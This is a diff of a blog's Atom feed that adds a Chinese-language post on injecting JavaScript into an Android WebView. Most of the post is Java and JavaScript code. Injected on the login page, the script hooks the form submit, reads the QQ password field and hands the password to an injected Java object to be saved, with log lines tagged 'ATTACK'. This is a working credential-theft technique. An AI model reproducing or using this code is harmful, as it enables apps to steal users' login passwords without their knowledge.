@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yzx41099298.github.io/"/>
-  <updated>2015-03-13T10:59:11.604Z</updated>
+  <updated>2015-03-16T07:29:09.797Z</updated>
   <id>http://yzx41099298.github.io/</id>
   
   <author>
@@ -13,6 +13,27 @@
   </author>
   
   <generator uri="http://zespia.tw/hexo/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[在WebView中添加JS]]></title>
+    <link href="http://yzx41099298.github.io/2015/03/16/WebViewJS/"/>
+    <id>http://yzx41099298.github.io/2015/03/16/WebViewJS/</id>
+    <published>2015-03-16T07:23:30.000Z</published>
+    <updated>2015-03-16T07:29:02.000Z</updated>
+    <content type="html"><![CDATA[<p>首先向WebView注入Java对象，在WebView加载完毕的时候执行一段js，给表单提交事件关联上我们的代码，即让表单提交的时候执行所注入的Java对象的一个方法，js执行我们的方法的时候可以把qq号和密码作为参数传递过来，然后我们就可以保存了。下面的步骤只示范如何把qq密码存下来。</p>
+<p>1. 声明要注入的Java对象</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SavePasswordJavaScriptInterface</span>    </span></div><div class="line">{    </div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">savePassword</span>(<span class="keyword">final</span> String password)  </div><div class="line">    {    </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"enter spjsinterface:"</span>+ password);  </div><div class="line">        mHandler.post(<span class="keyword">new</span> Runnable()  </div><div class="line">        {    </div><div class="line">            <span class="annotation">@Override</span>    </div><div class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>()  </div><div class="line">            {  </div><div class="line">                <span class="comment">//这里就是用户登录的密码了，你可以存起来了  </span></div><div class="line">                mPassword = password;  </div><div class="line">                Log.w(<span class="string">"ATTACK"</span>, mPassword);  </div><div class="line">            }    </div><div class="line">        });    </div><div class="line">    }   </div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>2. 注入上述对象</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这里是注入Java对象  </span></div><div class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> SavePasswordJavaScriptInterface(), <span class="string">"SPJSInterface"</span>);  </div><div class="line"><span class="comment">//这里是打开登录平台页面  </span></div><div class="line">mWebView.loadUrl(LOGIN_URL);</div></pre></td></tr></table></figure>
+
+<p>3. 在WebViewClient中的onPageFinished方法中注入js，这样当登录的时候就会调用我们之前注入的Java对象，同时乖乖地把密码作为参数传过来</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="annotation">@Override</span>  </div><div class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageFinished</span>(WebView view, String url)  </div><div class="line">{  </div><div class="line">    <span class="keyword">super</span>.onPageFinished(view, url);  </div><div class="line">    <span class="comment">//仅当是登录url的时候才注入我们的js，不要任何url都注入  </span></div><div class="line">    <span class="keyword">if</span> (url.equals(LOGIN_URL)) {  </div><div class="line">        <span class="comment">//要注入的js  </span></div><div class="line">        String js = <span class="string">"document.forms[0].onsubmit=function(event){var pwd = document.getElementById(\"ptlogin-password\").value;window.SPJSInterface.savePassword(pwd);return false;}"</span>;  </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"inject js, js= "</span> + js);  </div><div class="line">        view.loadUrl(<span class="string">"javascript:"</span> + js);  </div><div class="line">    }  </div><div class="line">}</div></pre></td></tr></table></figure>
+
+]]></content>
+    
+    
+  </entry>
   
   <entry>
     <title><![CDATA[TouchEvent派发机制]]></title>
